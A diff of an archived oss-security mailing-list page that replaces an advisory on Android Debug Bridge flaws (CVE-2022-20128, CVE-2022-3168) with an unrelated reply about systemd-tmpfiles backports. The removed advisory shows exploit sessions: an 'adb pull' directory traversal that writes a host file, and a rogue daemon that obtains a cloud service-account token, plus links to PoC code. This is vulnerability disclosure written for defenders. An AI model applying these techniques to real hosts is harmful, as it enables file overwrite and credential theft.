@@ -1,80 +1,30 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/10/25/5
-Message-ID: <CAPWzz4zTnbgP28eppkhPkMPSG7zCWLMrbvg4LsToU0pSRQ74JQ@mail.gmail.com>
-Date: Tue, 25 Oct 2022 15:52:53 +0200
-From: Imre Rad <radimre83@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/01/11/2
+Message-Id: <C899DB14-0747-4285-B1CC-113489A2796D@gentoo.org>
+Date: Tue, 11 Jan 2022 02:55:57 +0000
+From: Sam James <sam@...too.org>
 To: oss-security@...ts.openwall.com
-Subject: android debug bridge (adb) reverse connection and directory traversal
+Subject: Re: CVE-2021-3997: Uncontrolled recursion in systemd's systemd-tmpfiles
 Content-Type: text/plain; charset=utf-8
 
-Platform Tools v33.0.3
-(https://developer.android.com/studio/releases/platform-tools)
-released in August addresses two security issues in Android Debug
-Bridge. Both require the adb host (e.g. the PC) to connect to a
-compromised adb daemon (e.g. the mobile phone). This is a security
-concern for example in automated environments or malware labs that run
-arbitrary android packages by design.
-I found and reported these issues to Google last December.
-
-CVE-2022-20128:
-Adb was vulnerable to directory traversal attacks during adb pull
-operation. Example session (victim side):
-
-root@...d4cb8b202:/tmp/platform-tools# cat /etc/proof
-cat: /etc/proof: No such file or directory
-
-root@...d4cb8b202:/tmp/platform-tools# ./adb connect 10.6.8.145:5111
-* daemon not running; starting now at tcp:5037
-* daemon started successfully
-connected to 10.6.8.145:5111
-
-root@...d4cb8b202:/tmp/platform-tools# ./adb devices
-List of devices attached
-10.6.8.145:5111  device
-
-root@...d4cb8b202:/tmp/platform-tools# ./adb pull /data/local/tmp/1 /tmp/sdfsdf
-/data/local/tmp/1/: 1 file pulled, 0 skipped. 0.0 MB/s (11 bytes in 0.150s)
-
-root@...d4cb8b202:/tmp/platform-tools# cat /etc/proof
-hello world
 
 
-PoC code: https://github.com/irsl/CVE-2022-20128 (also attached here)
+> On 10 Jan 2022, at 18:08, Qualys Security Advisory <qsa@...lys.com> wrote:
+> 
+> Hi all,
+> 
+> We discovered a minor denial of service (an uncontrolled recursion) in
+> systemd-tmpfiles, CVE-2021-3997; the Coordinated Release Date is today
+> (January 10, 2022), and a patch is now available at (many thanks to
+> Zbigniew Jedrzejewski-Szmek for working on this):
+> [snip]
 
+For the benefit of distros:
 
-CVE-2022-3168:
-The reverse tunnel feature in Android Debug Bridge (adb) was
-vulnerable as it allowed malicious adb daemons to open connections to
-arbitrary host/ports and unix domain sockets on the host.
+Note that it's been backported in 250.x as 250.2 but there isn't
+a stable/backport release for 249.x yet.
 
-Example session; both sides running on Google Cloud virtual machines
-for sake of demonstration. Attacker receives the access token of the
-service account the victim VM is running as.
+Best,
+sam
 
-Victim:
-
-$ adb connect 10.128.0.5:5556
-connected to 10.128.0.5:5556
-
-Attacker side:
-
-$ ./adb_rogue_daemon.py
-
-...
-Wooho, we got response for our rouge request!
-b'HTTP/1.0 200 OK\r\nMetadata-Flavor: Google\r\nContent-Type:
-application/json\r\nDate: Thu, 04 Nov 2021 22:31:21 GMT\r\nServer:
-Metadata Server for VM\r\nConnection: Close\r\nContent-Length:
-1049\r\nX-XSS-Protection: 0\r\nX-Frame-Options:
-SAMEORIGIN\r\n\r\n{"access_token":"ya29.c.KpgBFghLV[redacted]....................................................................................................................................................................................................................................................................................................................................................................................................
-
-PoC code: https://github.com/irsl/CVE-2022-3168-adb-unexpected-reverse-forwards
-(also attached here)
-
-
-Regards,
-Imre
-
-View attachment "adbdirtrav.py" of type "text/plain" (8035 bytes)
-
-View attachment "adb_rogue_daemon.py" of type "text/plain" (3065 bytes)
+Download attachment "signature.asc" of type "application/pgp-signature" (619 bytes)
